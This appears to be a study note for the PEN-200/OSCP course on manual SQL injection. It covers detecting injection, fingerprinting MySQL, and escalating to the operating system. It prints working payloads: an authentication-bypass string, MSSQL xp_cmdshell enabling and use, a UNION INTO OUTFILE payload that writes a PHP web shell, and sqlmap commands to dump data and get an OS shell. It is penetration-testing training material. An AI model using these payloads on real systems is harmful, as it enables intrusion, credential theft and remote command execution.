# SQL Injection — PEN-200 Chapter 10

Use this as the manual SQLi workflow before jumping to automation.

## 1. Confirm possible injection

Start with normal input, then add a single quote and compare the response.

```text
normal_input
normal_input' 
```

A SQL syntax error or a repeatable application behavior change suggests the input reaches a backend SQL query.

### Authentication bypass pattern

```sql
offsec' OR 1=1 -- //
```

`OR 1=1` makes the condition true. `--` starts a SQL comment; include whitespace after it. Anything after the comment (for example, the password condition) is ignored.

## 2. Fingerprint / enumerate through the injection

### MySQL useful values

```sql
SELECT version();
SELECT @@version;
SELECT system_user();
SELECT database();
SELECT user();
```

Then choose an exploitation path based on what the application returns:

- [[SQLi — Error-Based]] — database errors are visible and leak query output.
- [[SQLi — UNION-Based]] — query results are displayed in the page and you can append another `SELECT`.
- [[Blind SQLi — Time-Based]] — direct database output is not returned; infer TRUE/FALSE from application behavior or response time.

## 3. Escalate from database data to OS access when possible

### MSSQL

A sufficiently privileged MSSQL login can enable and invoke `xp_cmdshell`:

```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
```

`xp_cmdshell` is disabled by default and uses `EXECUTE`, not `SELECT`. Commands run as the SQL Server service identity.

### MySQL file write → web shell

If the DB service account can write to a web-served directory:

```sql
' UNION SELECT "<?php system($_GET['cmd']);?>",null,null,null,null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

Then request the written file with a `cmd` parameter. The destination must be writable by the OS user running the database software.

See also [[MySQL UDF RCE (root creds + FILE priv)]].

## 4. Automate after manual confirmation

```bash
# Test a GET parameter
sqlmap -u "http://<IP>/blindsqli.php?user=1" -p user

# Dump reachable database data
sqlmap -u "http://<IP>/blindsqli.php?user=1" -p user --dump

# Replay a Burp-saved POST request and request an OS shell
sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
```

For authenticated POST requests, save the full request from Burp so the relevant cookie/session information is preserved.

> `sqlmap` is noisy and generates high traffic. PEN-200 recommends understanding/testing the injection manually first, especially when stealth matters.

## OSCP quick flow

```text
Input parameter
  ↓
Quote / syntax / behavior test
  ↓
Can DB output be seen?
  ├─ Yes → Error-based / UNION-based
  │          ↓
  │       fingerprint DB → enumerate schema → dump credentials/data
  │
  └─ No  → Blind SQLi
             ├─ Boolean behavior
             └─ Time delay
  ↓
Check DB privileges / file-write / execution features
  ├─ MSSQL → xp_cmdshell
  └─ MySQL → INTO OUTFILE web shell (if writable)
  ↓
Use sqlmap to automate confirmed paths when useful
